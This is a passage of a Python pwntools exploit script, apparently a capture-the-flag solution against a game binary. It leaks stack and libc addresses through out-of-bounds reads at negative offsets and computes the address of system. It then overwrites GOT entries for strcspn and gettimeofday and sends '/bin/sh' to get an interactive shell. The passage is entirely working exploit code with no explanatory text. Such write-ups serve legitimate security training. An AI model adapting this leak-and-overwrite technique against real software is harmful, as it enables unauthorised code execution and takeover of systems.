    r = conn()
    r.sendlineafter(b'name: ', b'meow')

    # start a game
    r.sendlineafter(b'option: ', b'1')

    # aslr leak
    localtime = read64(r, -464)
    print(hex(localtime))

    initialize_game = localtime + 0xc72
    print('initialize game: ', hex(initialize_game))

    # libc leak
    puts = read64(r, -448)
    print(hex(puts))


    print('setbuf', hex(read64(r, -448+16*2)))
    print('printf', hex(read64(r, -448+16*3)))
    print('fgets', hex(read64(r, -448+16*7)))
    print('getchar', hex(read64(r, -448+16*8)))

    libc = puts - 0x87bd0
    system = libc + 0x58740
    print('system: ', hex(system))

    # write to -368: strcspn
    write64(r, -368, system)
    print('wrote strcspn = ', hex(system))

    # write to -384: gettimeofday
    write64(r, -384, initialize_game)
    print('wrote gettimeofday = ', hex(initialize_game))

    r.sendlineafter(b'option: ', b'4')
    r.sendlineafter(b'option: ', b'3')
    r.sendlineafter(b'name: ', b'/bin/sh')

    r.interactive()


if __name__ == "__main__":
    main()
```
